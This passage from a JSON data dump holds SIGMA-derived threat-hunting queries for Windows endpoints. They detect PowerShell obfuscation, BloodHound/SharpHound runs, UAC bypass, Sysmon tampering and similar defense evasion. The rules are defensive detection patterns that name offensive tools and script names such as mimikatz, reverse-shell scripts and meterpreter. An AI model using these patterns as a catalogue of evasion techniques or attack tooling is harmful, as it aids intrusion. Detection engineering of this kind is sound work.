            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 420
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated Powershell via VAR++ LAUNCHER",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"&&set\" and tgt.process.cmdline contains \"cmd\" and tgt.process.cmdline contains \"/c\" and tgt.process.cmdline contains \"-f\") and (tgt.process.cmdline contains \"{0}\" or tgt.process.cmdline contains \"{1}\" or tgt.process.cmdline contains \"{2}\" or tgt.process.cmdline contains \"{3}\" or tgt.process.cmdline contains \"{4}\" or tgt.process.cmdline contains \"{5}\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 421
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command line parameters used by Bloodhound and Sharphound hack tools",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1087",
                "t1087",
                "t1482",
                "t1069",
                "t1069",
                "t1059"
            ],
            "name": "HackTool - Bloodhound/Sharphound Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.displayName contains \"SharpHound\" or tgt.process.displayName contains \"SharpHound\" or (tgt.process.publisher contains \"SpecterOps\" or tgt.process.publisher contains \"evil corp\") or (tgt.process.image.path contains \"\\Bloodhound.exe\" or tgt.process.image.path contains \"\\SharpHound.exe\")) or (tgt.process.cmdline contains \" -CollectionMethod All \" or tgt.process.cmdline contains \" --CollectionMethods Session \" or tgt.process.cmdline contains \" --Loop --Loopduration \" or tgt.process.cmdline contains \" --PortScanTimeout \" or tgt.process.cmdline contains \".exe -c All -d \" or tgt.process.cmdline contains \"Invoke-Bloodhound\" or tgt.process.cmdline contains \"Get-BloodHoundData\") or (tgt.process.cmdline contains \" -JsonFolder \" and tgt.process.cmdline contains \" -ZipFileName \") or (tgt.process.cmdline contains \" DCOnly \" and tgt.process.cmdline contains \" --NoSaveCache \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 422
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious Program Names",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\CVE-202\" or tgt.process.image.path contains \"\\CVE202\") or (tgt.process.image.path contains \"\\poc.exe\" or tgt.process.image.path contains \"\\artifact.exe\" or tgt.process.image.path contains \"\\artifact64.exe\" or tgt.process.image.path contains \"\\artifact_protected.exe\" or tgt.process.image.path contains \"\\artifact32.exe\" or tgt.process.image.path contains \"\\artifact32big.exe\" or tgt.process.image.path contains \"obfuscated.exe\" or tgt.process.image.path contains \"obfusc.exe\" or tgt.process.image.path contains \"\\meterpreter\")) or (tgt.process.cmdline contains \"inject.ps1\" or tgt.process.cmdline contains \"Invoke-CVE\" or tgt.process.cmdline contains \"pupy.ps1\" or tgt.process.cmdline contains \"payload.ps1\" or tgt.process.cmdline contains \"beacon.ps1\" or tgt.process.cmdline contains \"PowerView.ps1\" or tgt.process.cmdline contains \"bypass.ps1\" or tgt.process.cmdline contains \"obfuscated.ps1\" or tgt.process.cmdline contains \"obfusc.ps1\" or tgt.process.cmdline contains \"obfus.ps1\" or tgt.process.cmdline contains \"obfs.ps1\" or tgt.process.cmdline contains \"evil.ps1\" or tgt.process.cmdline contains \"MiniDogz.ps1\" or tgt.process.cmdline contains \"_enc.ps1\" or tgt.process.cmdline contains \"\\shell.ps1\" or tgt.process.cmdline contains \"\\rshell.ps1\" or tgt.process.cmdline contains \"revshell.ps1\" or tgt.process.cmdline contains \"\\av.ps1\" or tgt.process.cmdline contains \"\\av_test.ps1\" or tgt.process.cmdline contains \"adrecon.ps1\" or tgt.process.cmdline contains \"mimikatz.ps1\" or tgt.process.cmdline contains \"\\PowerUp_\" or tgt.process.cmdline contains \"powerup.ps1\" or tgt.process.cmdline contains \"\\Temp\\a.ps1\" or tgt.process.cmdline contains \"\\Temp\\p.ps1\" or tgt.process.cmdline contains \"\\Temp\\1.ps1\" or tgt.process.cmdline contains \"Hound.ps1\" or tgt.process.cmdline contains \"encode.ps1\" or tgt.process.cmdline contains \"powercat.ps1\"))) | columns tgt.process.cmdline,src.process.cmdline,tgt.process.image.path",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 423
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects updates to Sysmon's configuration. Attackers might update or replace the Sysmon configuration with a bare bone one to avoid monitoring without shutting down the service completely",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Sysmon Configuration Update",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\Sysmon64.exe\" or tgt.process.image.path contains \"\\Sysmon.exe\") or tgt.process.displayName=\"System activity monitor\") and (tgt.process.cmdline contains \"-c\" or tgt.process.cmdline contains \"/c\" or tgt.process.cmdline contains \"\u2013c\" or tgt.process.cmdline contains \"\u2014c\" or tgt.process.cmdline contains \"\u2015c\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 424
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using Event Viewer RecentViews",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "UAC Bypass Using Event Viewer RecentViews",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\Event Viewer\\RecentViews\" or tgt.process.cmdline contains \"\\EventV~1\\RecentViews\") and tgt.process.cmdline contains \">\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 425
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious addition to BitLocker related registry keys via the reg.exe utility",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1486"
            ],
            "name": "Suspicious Reg Add BitLocker",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"REG\" and tgt.process.cmdline contains \"ADD\" and tgt.process.cmdline contains \"\\SOFTWARE\\Policies\\Microsoft\\FVE\" and tgt.process.cmdline contains \"/v\" and tgt.process.cmdline contains \"/f\") and (tgt.process.cmdline contains \"EnableBDEWithNoTPM\" or tgt.process.cmdline contains \"UseAdvancedStartup\" or tgt.process.cmdline contains \"UseTPM\" or tgt.process.cmdline contains \"UseTPMKey\" or tgt.process.cmdline contains \"UseTPMKeyPIN\" or tgt.process.cmdline contains \"RecoveryKeyMessageSource\" or tgt.process.cmdline contains \"UseTPMPIN\" or tgt.process.cmdline contains \"RecoveryKeyMessage\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 426
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "The Tasks folder in system32 and syswow64 are globally writable paths.\nAdversaries can take advantage of this and load or influence any script hosts or ANY .NET Application\nin Tasks to load and execute a custom assembly into cscript, wscript, regsvr32, mshta, eventvwr\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Tasks Folder Evasion",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"echo \" or tgt.process.cmdline contains \"copy \" or tgt.process.cmdline contains \"type \" or tgt.process.cmdline contains \"file createnew\") and (tgt.process.cmdline contains \" C:\\Windows\\System32\\Tasks\\\" or tgt.process.cmdline contains \" C:\\Windows\\SysWow64\\Tasks\\\"))) | columns tgt.process.cmdline,ParentProcess",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 427
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect VBoxDrvInst.exe run with parameters allowing processing INF file.\nThis allows to create values in the registry and install drivers.\nFor example one could use this technique to obtain persistence via modifying one of Run or RunOnce registry keys\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1112"
            ],
            "name": "Suspicious VBoxDrvInst.exe Parameters",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\VBoxDrvInst.exe\" and (tgt.process.cmdline contains \"driver\" and tgt.process.cmdline contains \"executeinf\"))) | columns ComputerName,tgt.process.user,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 428
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 1",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\ud83d\ude00\" or tgt.process.cmdline contains \"\ud83d\ude03\" or tgt.process.cmdline contains \"\ud83d\ude04\" or tgt.process.cmdline contains \"\ud83d\ude01\" or tgt.process.cmdline contains \"\ud83d\ude06\" or tgt.process.cmdline contains \"\ud83d\ude05\" or tgt.process.cmdline contains \"\ud83d\ude02\" or tgt.process.cmdline contains \"\ud83e\udd23\" or tgt.process.cmdline contains \"\ud83e\udd72\" or tgt.process.cmdline contains \"\ud83e\udd79\" or tgt.process.cmdline contains \"\u263a\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude0a\" or tgt.process.cmdline contains \"\ud83d\ude07\" or tgt.process.cmdline contains \"\ud83d\ude42\" or tgt.process.cmdline contains \"\ud83d\ude43\" or tgt.process.cmdline contains \"\ud83d\ude09\" or tgt.process.cmdline contains \"\ud83d\ude0c\" or tgt.process.cmdline contains \"\ud83d\ude0d\" or tgt.process.cmdline contains \"\ud83e\udd70\" or tgt.process.cmdline contains \"\ud83d\ude18\" or tgt.process.cmdline contains \"\ud83d\ude17\" or tgt.process.cmdline contains \"\ud83d\ude19\" or tgt.process.cmdline contains \"\ud83d\ude1a\" or tgt.process.cmdline contains \"\ud83d\ude0b\" or tgt.process.cmdline contains \"\ud83d\ude1b\" or tgt.process.cmdline contains \"\ud83d\ude1d\" or tgt.process.cmdline contains \"\ud83d\ude1c\" or tgt.process.cmdline contains \"\ud83e\udd2a\" or tgt.process.cmdline contains \"\ud83e\udd28\" or tgt.process.cmdline contains \"\ud83e\uddd0\" or tgt.process.cmdline contains \"\ud83e\udd13\" or tgt.process.cmdline contains \"\ud83d\ude0e\" or tgt.process.cmdline contains \"\ud83e\udd78\" or tgt.process.cmdline contains \"\ud83e\udd29\" or tgt.process.cmdline contains \"\ud83e\udd73\" or tgt.process.cmdline contains \"\ud83d\ude0f\" or tgt.process.cmdline contains \"\ud83d\ude12\" or tgt.process.cmdline contains \"\ud83d\ude1e\" or tgt.process.cmdline contains \"\ud83d\ude14\" or tgt.process.cmdline contains \"\ud83d\ude1f\" or tgt.process.cmdline contains \"\ud83d\ude15\" or tgt.process.cmdline contains \"\ud83d\ude41\" or tgt.process.cmdline contains \"\u2639\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude23\" or tgt.process.cmdline contains \"\ud83d\ude16\" or tgt.process.cmdline contains \"\ud83d\ude2b\" or tgt.process.cmdline contains \"\ud83d\ude29\" or tgt.process.cmdline contains \"\ud83e\udd7a\" or tgt.process.cmdline contains \"\ud83d\ude22\" or tgt.process.cmdline contains \"\ud83d\ude2d\" or tgt.process.cmdline contains \"\ud83d\ude2e\u200d\ud83d\udca8\" or tgt.process.cmdline contains \"\ud83d\ude24\" or tgt.process.cmdline contains \"\ud83d\ude20\" or tgt.process.cmdline contains \"\ud83d\ude21\" or tgt.process.cmdline contains \"\ud83e\udd2c\" or tgt.process.cmdline contains \"\ud83e\udd2f\" or tgt.process.cmdline contains \"\ud83d\ude33\" or tgt.process.cmdline contains \"\ud83e\udd75\" or tgt.process.cmdline contains \"\ud83e\udd76\" or tgt.process.cmdline contains \"\ud83d\ude31\" or tgt.process.cmdline contains \"\ud83d\ude28\" or tgt.process.cmdline contains \"\ud83d\ude30\" or tgt.process.cmdline contains \"\ud83d\ude25\" or tgt.process.cmdline contains \"\ud83d\ude13\" or tgt.process.cmdline contains \"\ud83e\udee3\" or tgt.process.cmdline contains \"\ud83e\udd17\" or tgt.process.cmdline contains \"\ud83e\udee1\" or tgt.process.cmdline contains \"\ud83e\udd14\" or tgt.process.cmdline contains \"\ud83e\udee2\" or tgt.process.cmdline contains \"\ud83e\udd2d\" or tgt.process.cmdline contains \"\ud83e\udd2b\" or tgt.process.cmdline contains \"\ud83e\udd25\" or tgt.process.cmdline contains \"\ud83d\ude36\" or tgt.process.cmdline contains \"\ud83d\ude36\u200d\ud83c\udf2b\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude10\" or tgt.process.cmdline contains \"\ud83d\ude11\" or tgt.process.cmdline contains \"\ud83d\ude2c\" or tgt.process.cmdline contains \"\ud83e\udee0\" or tgt.process.cmdline contains \"\ud83d\ude44\" or tgt.process.cmdline contains \"\ud83d\ude2f\" or tgt.process.cmdline contains \"\ud83d\ude26\" or tgt.process.cmdline contains \"\ud83d\ude27\" or tgt.process.cmdline contains \"\ud83d\ude2e\" or tgt.process.cmdline contains \"\ud83d\ude32\" or tgt.process.cmdline contains \"\ud83e\udd71\" or tgt.process.cmdline contains \"\ud83d\ude34\" or tgt.process.cmdline contains \"\ud83e\udd24\" or tgt.process.cmdline contains \"\ud83d\ude2a\" or tgt.process.cmdline contains \"\ud83d\ude35\" or tgt.process.cmdline contains \"\ud83d\ude35\u200d\ud83d\udcab\" or tgt.process.cmdline contains \"\ud83e\udee5\" or tgt.process.cmdline contains \"\ud83e\udd10\" or tgt.process.cmdline contains \"\ud83e\udd74\" or tgt.process.cmdline contains \"\ud83e\udd22\" or tgt.process.cmdline contains \"\ud83e\udd2e\" or tgt.process.cmdline contains \"\ud83e\udd27\" or tgt.process.cmdline contains \"\ud83d\ude37\" or tgt.process.cmdline contains \"\ud83e\udd12\" or tgt.process.cmdline contains \"\ud83e\udd15\" or tgt.process.cmdline contains \"\ud83e\udd11\" or tgt.process.cmdline contains \"\ud83e\udd20\" or tgt.process.cmdline contains \"\ud83d\ude08\" or tgt.process.cmdline contains \"\ud83d\udc7f\" or tgt.process.cmdline contains \"\ud83d\udc79\" or tgt.process.cmdline contains \"\ud83d\udc7a\" or tgt.process.cmdline contains \"\ud83e\udd21\" or tgt.process.cmdline contains \"\ud83d\udca9\" or tgt.process.cmdline contains \"\ud83d\udc7b\" or tgt.process.cmdline contains \"\ud83d\udc80\" or tgt.process.cmdline contains \"\u2620\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc7d\" or tgt.process.cmdline contains \"\ud83d\udc7e\" or tgt.process.cmdline contains \"\ud83e\udd16\" or tgt.process.cmdline contains \"\ud83c\udf83\" or tgt.process.cmdline contains \"\ud83d\ude3a\" or tgt.process.cmdline contains \"\ud83d\ude38\" or tgt.process.cmdline contains \"\ud83d\ude39\" or tgt.process.cmdline contains \"\ud83d\ude3b\" or tgt.process.cmdline contains \"\ud83d\ude3c\" or tgt.process.cmdline contains \"\ud83d\ude3d\" or tgt.process.cmdline contains \"\ud83d\ude40\" or tgt.process.cmdline contains \"\ud83d\ude3f\" or tgt.process.cmdline contains \"\ud83d\ude3e\" or tgt.process.cmdline contains \"\ud83d\udc4b\" or tgt.process.cmdline contains \"\ud83e\udd1a\" or tgt.process.cmdline contains \"\ud83d\udd90\" or tgt.process.cmdline contains \"\u270b\" or tgt.process.cmdline contains \"\ud83d\udd96\" or tgt.process.cmdline contains \"\ud83d\udc4c\" or tgt.process.cmdline contains \"\ud83e\udd0c\" or tgt.process.cmdline contains \"\ud83e\udd0f\" or tgt.process.cmdline contains \"\u270c\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd1e\" or tgt.process.cmdline contains \"\ud83e\udef0\" or tgt.process.cmdline contains \"\ud83e\udd1f\" or tgt.process.cmdline contains \"\ud83e\udd18\" or tgt.process.cmdline contains \"\ud83e\udd19\" or tgt.process.cmdline contains \"\ud83e\udef5\" or tgt.process.cmdline contains \"\ud83e\udef1\" or tgt.process.cmdline contains \"\ud83e\udef2\" or tgt.process.cmdline contains \"\ud83e\udef3\" or tgt.process.cmdline contains \"\ud83e\udef4\" or tgt.process.cmdline contains \"\ud83d\udc48\" or tgt.process.cmdline contains \"\ud83d\udc49\" or tgt.process.cmdline contains \"\ud83d\udc46\" or tgt.process.cmdline contains \"\ud83d\udd95\" or tgt.process.cmdline contains \"\ud83d\udc47\" or tgt.process.cmdline contains \"\u261d\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc4d\" or tgt.process.cmdline contains \"\ud83d\udc4e\" or tgt.process.cmdline contains \"\u270a\" or tgt.process.cmdline contains \"\ud83d\udc4a\" or tgt.process.cmdline contains \"\ud83e\udd1b\" or tgt.process.cmdline contains \"\ud83e\udd1c\" or tgt.process.cmdline contains \"\ud83d\udc4f\" or tgt.process.cmdline contains \"\ud83e\udef6\" or tgt.process.cmdline contains \"\ud83d\ude4c\" or tgt.process.cmdline contains \"\ud83d\udc50\" or tgt.process.cmdline contains \"\ud83e\udd32\" or tgt.process.cmdline contains \"\ud83e\udd1d\" or tgt.process.cmdline contains \"\ud83d\ude4f\" or tgt.process.cmdline contains \"\u270d\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udcaa\" or tgt.process.cmdline contains \"\ud83e\uddbe\" or tgt.process.cmdline contains \"\ud83e\uddb5\" or tgt.process.cmdline contains \"\ud83e\uddbf\" or tgt.process.cmdline contains \"\ud83e\uddb6\" or tgt.process.cmdline contains \"\ud83d\udc63\" or tgt.process.cmdline contains \"\ud83d\udc42\" or tgt.process.cmdline contains \"\ud83e\uddbb\" or tgt.process.cmdline contains \"\ud83d\udc43\" or tgt.process.cmdline contains \"\ud83e\udec0\" or tgt.process.cmdline contains \"\ud83e\udec1\" or tgt.process.cmdline contains \"\ud83e\udde0\" or tgt.process.cmdline contains \"\ud83e\uddb7\" or tgt.process.cmdline contains \"\ud83e\uddb4\" or tgt.process.cmdline contains \"\ud83d\udc40\" or tgt.process.cmdline contains \"\ud83d\udc41\" or tgt.process.cmdline contains \"\ud83d\udc45\" or tgt.process.cmdline contains \"\ud83d\udc44\" or tgt.process.cmdline contains \"\ud83e\udee6\" or tgt.process.cmdline contains \"\ud83d\udc8b\" or tgt.process.cmdline contains \"\ud83e\ude78\" or tgt.process.cmdline contains \"\ud83d\udc76\" or tgt.process.cmdline contains \"\ud83d\udc67\" or tgt.process.cmdline contains \"\ud83e\uddd2\" or tgt.process.cmdline contains \"\ud83d\udc66\" or tgt.process.cmdline contains \"\ud83d\udc69\" or tgt.process.cmdline contains \"\ud83e\uddd1\" or tgt.process.cmdline contains \"\ud83d\udc68\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc71\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc71\" or tgt.process.cmdline contains \"\ud83d\udc71\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc69\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd1\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83d\udc68\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd4\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\" or tgt.process.cmdline contains \"\ud83e\uddd4\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc75\" or tgt.process.cmdline contains \"\ud83e\uddd3\" or tgt.process.cmdline contains \"\ud83d\udc74\" or tgt.process.cmdline contains \"\ud83d\udc72\" or tgt.process.cmdline contains \"\ud83d\udc73\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc73\" or tgt.process.cmdline contains \"\ud83d\udc73\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd5\" or tgt.process.cmdline contains \"\ud83d\udc6e\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6e\" or tgt.process.cmdline contains \"\ud83d\udc6e\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\" or 